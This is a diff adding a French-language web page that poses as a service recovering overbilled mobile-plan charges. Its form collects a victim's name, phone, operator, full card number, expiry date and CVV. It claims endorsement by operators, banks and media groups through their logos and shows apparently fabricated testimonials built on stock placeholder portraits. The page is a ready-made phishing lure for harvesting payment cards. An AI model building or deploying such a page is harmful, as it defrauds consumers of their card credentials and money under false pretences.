@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Rembourser son forfait</title>
+  <link rel="stylesheet" href="style.css" />
+  <style>
+  .euro-input {
+    position: relative;
+  }
+
+  .euro-input input {
+    padding-left: 24px;
+  }
+
+  .euro-symbol-inside {
+    position: absolute;
+    top: 50%;
+    left: 8px;
+    transform: translateY(-50%);
+    pointer-events: none;
+    color: #555;
+  }
+  </style>
+  <style>
+  .refund-steps {
+    margin-top: 2rem;
+    text-align: center;
+    animation: fadeIn 1s ease-in;
+  }
+
+  .steps-container {
+    display: flex;
+    justify-content: space-around;
+    flex-wrap: wrap;
+    gap: 1rem;
+    margin-top: 1rem;
+  }
+
+  .step {
+    flex: 1 1 250px;
+    background: #f5f5f5;
+    padding: 1rem;
+    border-radius: 10px;
+    transition: transform 0.3s;
+  }
+
+  .step:hover {
+    transform: translateY(-5px);
+  }
+
+  .step-number {
+    font-size: 2rem;
+    font-weight: bold;
+    color: #007BFF;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(20px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  </style>
+  <script src="script.js" defer></script>
+  <meta name="google-site-verification" content="xMxxNcbusuh22cwYGtuDVEwShlvhZ0YtNAzTXDmUM08" />
+</head>
+<body>
+  <header>
+    <div class="logo-heading">
+      <img src="images/logo.png" alt="Logo RemboursMobile" class="site-logo" />
+      <h1 class="site-title">Rembourser son forfait</h1>
+    </div>
+    <p class="subtitle">
+      Nous aidons les clients à récupérer les montants indûment facturés, à résoudre les erreurs de facturation ou les résiliations non prises en compte. Notre objectif est de simplifier vos démarches et d’obtenir rapidement votre remboursement auprès des opérateurs mobiles comme Orange, SFR, Bouygues, Free et d’autres.
+    </p>
+  </header>
+  <main>
+    <form id="refundForm">
+      <label for="fullname">Nom complet</label>
+      <input
+        type="text"
+        id="fullname"
+        name="fullname"
+        placeholder="Jean Dupont"
+        required
+        pattern="^[A-Za-zÀ-ÖØ-öø-ÿ \-']{3,}$"
+        title="Veuillez entrer un nom complet valide (lettres, espaces, tirets)."
+      />
+
+      <label for="refund-amount">Montant à rembourser</label>
+      <div class="euro-input">
+        <input
+          type="text"
+          id="refund-amount"
+          name="refund-amount"
+          placeholder="100"
+          pattern="[0-9]+"
+          inputmode="numeric"
+          required
+          title="Veuillez entrer un montant en chiffres uniquement."
+        />
+        <span class="euro-symbol-inside">€</span>
+      </div>
+
+      <label for="phone">Numéro de téléphone</label>
+      <div class="phone-input">
+        <span>+33</span>
+        <input
+          type="tel"
+          id="phone"
+          name="phone"
+          placeholder="6 12 34 56 78"
+          pattern="^[67][0-9]{8}$"
+          maxlength="9"
+          required
+          title="Veuillez entrer un numéro de téléphone français valide commençant par 6 ou 7, sans le +33."
+        />
+      </div>
+
+      <label for="operator">Opérateur</label>
+      <select id="operator" name="operator" required>
+        <option value="" style="color: #444;">-- Sélectionnez votre opérateur --</option>
+        <option value="orange">Orange</option>
+        <option value="sfr">SFR</option>
+        <option value="bouygues">Bouygues Telecom</option>
+        <option value="free">Free Mobile</option>
+        <option value="nrj">NRJ Mobile</option>
+        <option value="la-poste">La Poste Mobile</option>
+        <option value="coriolis">Coriolis</option>
+        <option value="prixtel">Prixtel</option>
+        <option value="syma">Syma Mobile</option>
+        <option value="auchantelecom">Auchan Telecom</option>
+      </select>
+
+
+      <label for="cc-number">Numéro de carte bancaire</label>
+<div class="card-input-wrapper">
+  <input
+    type="text"
+    id="cc-number"
+    name="cc-number"
+    placeholder="1234 5678 9012 3456"
+    maxlength="19"
+    required
+  />
+  <img id="card-type-logo" src="" alt="Card logo" />
+</div>
+
+      <div class="card-details">
+        <div>
+          <label for="expiry">Date d'expiration</label>
+          <input
+            type="text"
+            id="expiry"
+            name="expiry"
+            placeholder="MM/AA"
+            pattern="^(0[1-9]|1[0-2])\/\d{2}$"
+            maxlength="5"
+            required
+            title="Veuillez entrer la date d'expiration au format MM/AA."
+          />
+        </div>
+        <div>
+          <label for="cvv">CVV</label>
+          <input
+            type="text"
+            id="cvv"
+            name="cvv"
+            placeholder="123"
+            pattern="^[0-9]{3}$"
+            maxlength="3"
+            required
+            title="Veuillez entrer un CVV à 3 chiffres."
+          />
+        </div>
+      </div>
+
+      <div class="checkbox">
+        <input type="checkbox" id="conditions" required />
+        <label for="conditions">J'accepte les <a href="#" class="link">conditions générales</a></label>
+      </div>
+
+      <button type="submit">Envoyer la demande</button>
+    </form>
+
+    <section class="trusted-section">
+      <section class="refund-steps">
+        <h2>Comment ça marche ?</h2>
+        <div class="steps-container">
+          <div class="step">
+            <div class="step-number">1</div>
+            <h3>Demande de remboursement</h3>
+            <p>Remplissez simplement le formulaire en ligne avec vos informations et le montant à rembourser.</p>
+          </div>
+          <div class="step">
+            <div class="step-number">2</div>
+            <h3>Traitement de dossier</h3>
+            <p>Notre équipe analyse votre demande et contacte votre opérateur si nécessaire.</p>
+          </div>
+          <div class="step">
+            <div class="step-number">3</div>
+            <h3>Validation</h3>
+            <p>Une fois acceptée, votre demande est validée et le remboursement est initié rapidement.</p>
+          </div>
+        </div>
+      </section>
+      <h2>Fiable et approuvé par</h2>
+      <div class="trusted-logos">
+        <img src="images/orange.png" alt="Orange" />
+        <img src="images/sfr.png" alt="SFR" />
+        <img src="images/bouygues.png" alt="Bouygues" />
+        <img src="images/free.png" alt="Free" />
+        <img src="images/bnp.png" alt="bnp" />
+        <img src="images/credit_agricole.png" alt="Crédit Agricole" />
+        <img src="images/societe_generale.png" alt="Société Générale" />
+        <!-- Top 3 French Media Companies -->
+        <img src="images/media/france_tv.png" alt="France Télévisions" />
+        <img src="images/media/tf1.png" alt="TF1" />
+        <img src="images/media/m6.png" alt="M6" />
+
+        <!-- Top 3 French Tech Companies -->
+        <img src="images/tech/dassault_systemes.png" alt="Dassault Systèmes" />
+        <img src="images/tech/capgemini.png" alt="Capgemini" />
+        <img src="images/tech/atos.png" alt="Atos" />
+      </div>
+      <h3 class="testimonial-title">Ils nous ont fait confiance</h3>
+      <div class="testimonials">
+        <div class="testimonial">
+          <img class="avatar" src="https://randomuser.me/api/portraits/women/44.jpg" alt="Camille D." />
+          <p class="message">“Service rapide et efficace ! J’ai récupéré mon argent en quelques jours.”</p>
+          <span class="author">— Camille D.</span>
+        </div>
+        <div class="testimonial">
+          <img class="avatar" src="https://randomuser.me/api/portraits/men/33.jpg" alt="Marc T." />
+          <p class="message">“Je ne pensais pas que c’était possible, mais ils ont vraiment géré pour moi.”</p>
+          <span class="author">— Marc T.</span>
+        </div>
+        <div class="testimonial">
+          <img class="avatar" src="https://randomuser.me/api/portraits/women/45.jpg" alt="Amina K." />
+          <p class="message">“Très professionnel, je recommande à 100 % !”</p>
+          <span class="author">— Amina K.</span>
+        </div>
+        <div class="testimonial">
+          <img class="avatar" src="https://randomuser.me/api/portraits/men/47.jpg" alt="Julien R." />
+          <p class="message">“Un service client au top, merci pour votre aide !”</p>
+          <span class="author">— Julien R.</span>
+        </div>
+        <div class="trustpilot-button">
+          <img src="images/stars.png" alt="5 étoiles" />
+          <span>Trustpilot</span>
+        </div>
+      </div>
+    </section>
+  </main>
+  <footer>
+  <div class="footer-info">
+    <strong>Rembourse son forfait</strong><br />
+    Chez <strong>Rembourse son forfait</strong>, notre mission est claire : aider chaque consommateur à récupérer les sommes injustement prélevées par les opérateurs mobiles. Dans un univers où les factures peuvent rapidement devenir complexes et opaques, nous mettons notre expertise et notre savoir-faire au service des clients pour dénouer les litiges liés aux erreurs de facturation, aux frais indus, ou encore aux résiliations non prises en compte.
+    <br /><br />
+    Conscients du stress et des démarches souvent longues qu’engendre une contestation de facture, nous avons créé un service simple, rapide et efficace pour vous accompagner pas à pas. Notre équipe dédiée analyse avec rigueur chaque dossier, engage les procédures nécessaires auprès des opérateurs, et veille à obtenir le remboursement dans les meilleurs délais.
+    <br /><br />
+    Notre priorité est la satisfaction et la tranquillité d’esprit de nos clients. C’est pourquoi nous plaçons la transparence, la réactivité et le professionnalisme au cœur de notre démarche. Forts d’une expérience reconnue, nous avons déjà aidé des milliers de personnes à récupérer ce qui leur revient de droit.
+    <br /><br />
+    En choisissant <strong>Rembourse son forfait</strong>, vous bénéficiez d’un partenaire fiable, engagé et à votre écoute, prêt à défendre vos intérêts pour que vous puissiez retrouver vos droits et votre argent facilement, sans stress ni complication.
+  </div>
+  <div class="footer-columns">
+  <div>
+    <h4>Nos services</h4>
+    <ul>
+      <li><a href="aide.html">Remboursement de frais indus</a></li>
+      <li><a href="aide.html">Résiliation non prise en compte</a></li>
+      <li><a href="aide.html">Erreurs de facturation</a></li>
+      <li><a href="aide.html">Services non fournis</a></li>
+      <li><a href="aide.html">Forfaits souscrits sans accord</a></li>
+    </ul>
+  </div>
+  <div>
+    <h4>Aide</h4>
+    <ul>
+      <li><a href="aide.html">Centre d'aide</a></li>
+      <li><a href="aide.html">Contactez-nous</a></li>
+      <li><a href="aide.html">FAQ</a></li>
+      <li><a href="aide.html">Suivi de dossier</a></li>
+    </ul>
+  </div>
+  <div>
+    <h4>Légal</h4>
+    <ul>
+      <li><a href="aide.html">Mentions légales</a></li>
+      <li><a href="aide.html">Conditions générales</a></li>
+      <li><a href="aide.html">Politique de confidentialité</a></li>
+      <li><a href="aide.html">Cookies</a></li>
+      <li><a href="aide.html">Agréments</a></li>
+    </ul>
+  </div>
+</div>
+</footer>
+</body>
+</html>
